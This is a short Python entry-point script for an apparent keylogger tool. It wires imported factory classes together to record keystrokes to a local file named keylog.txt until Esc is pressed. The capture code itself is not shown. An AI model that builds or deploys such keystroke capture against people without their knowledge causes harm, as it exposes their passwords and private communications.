from utils.writer_factory import WriterFactory
from utils.key_logger_factory import KeyLoggerFactory

def main():
    writer = WriterFactory.create_writer("file", "keylog.txt")
    logger = KeyLoggerFactory.create_logger(writer)
    
    try:
        logger.start_logging()
        input("Press Esc to stop logging...")
    finally:
        logger.stop_logging()
        writer.close()
    
if __name__ == "__main__":
    main()